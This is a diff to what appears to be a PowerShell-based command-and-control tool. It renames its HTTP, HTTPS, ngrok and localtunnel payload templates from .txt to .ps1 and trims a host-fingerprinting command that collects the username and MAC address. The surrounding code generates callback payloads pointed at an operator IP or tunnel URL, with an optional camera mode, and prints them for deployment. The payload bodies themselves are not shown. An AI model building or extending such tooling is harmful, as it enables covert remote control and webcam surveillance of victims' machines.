@@ -60,8 +60,6 @@ def getInfo():
                             "$m2 = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.MacAddress -ne '' } | "
                             "Select-Object -First 1).MacAddress; "
                             "if ($m2) { $m2.Replace('-',':') } else { 'unknown' } }"
-                            'Get-NetAdapter -Name "Wi-Fi" | Select-Object MacAddress'
-                            'Get-NetAdapter -Name "Ethernet" | Select-Object MacAddress'
                         )
                         hostname = control.run("whoami")
                         mac = control.run(mac_cmd).strip()
@@ -686,13 +684,12 @@ if __name__ == '__main__':
                 if tunnel_url:
                     ip = tunnel_url
                     # For tunnels, we select the specific payload
-                    target_payload = "tunnel.txt"
                     if args.ngrok: 
-                        target_payload = "ngrok.txt"
+                        target_payload = "ngrok.ps1"
                     elif args.localtunnel: 
-                        target_payload = "localtunnel.txt"
+                        target_payload = "localtunnel.ps1"
                     
-                    # we pass "443" as port just to satisfy the function signature, but it's not used in tunnel.txt/ngrok.txt
+                    # we pass "443" as port just to satisfy the function signature, but it's not used in ngrok.ps1
                     payload = s.payload.generatePayload(ip, "443", target_payload, camera_mode=args.camera)
                     print_payload(payload, [ip], args)
                     
@@ -712,13 +709,13 @@ if __name__ == '__main__':
 
                     if int(args.http_port) != 0:
                         port = args.http_port
-                        payload = s.payload.generatePayload(ip, port, "http.txt", camera_mode=args.camera)
+                        payload = s.payload.generatePayload(ip, port, "http.ps1", camera_mode=args.camera)
                         print("[+] HTTP payload ({}:{}):\n".format(ip, port))
                         print_payload(payload, [ip, port], args)
 
                     if int(args.https_port) != 0:
                         port = args.https_port
-                        payload = s.payload.generatePayload(ip, port, "https.txt", camera_mode=args.camera)
+                        payload = s.payload.generatePayload(ip, port, "https.ps1", camera_mode=args.camera)
                         print("[+] HTTPS payload ({}:{}):\n".format(ip, port))
                         print_payload(payload, [ip, port], args)
                 else:
@@ -727,15 +724,15 @@ if __name__ == '__main__':
                         print("[+] not enough arguments - view \"help\" to view arguments for this command")
                         continue
                     ip, port = cArgs.split(" ", 1)
-                    target_payload = "http.txt"
+                    target_payload = "http.ps1"
                     if int(port) == int(args.https_port) or int(port) == 443:
-                        target_payload = "https.txt"
+                        target_payload = "https.ps1"
                     
                     # If using tunnel flags but without automatic tunnel URL (or with it), prioritize tunnel payloads
                     if args.ngrok:
-                        target_payload = "ngrok.txt"
+                        target_payload = "ngrok.ps1"
                     elif args.localtunnel:
-                        target_payload = "localtunnel.txt"
+                        target_payload = "localtunnel.ps1"
 
                     payload = s.payload.generatePayload(ip, port, target_payload, camera_mode=args.camera)
                     print_payload(payload, [ip, port], args)
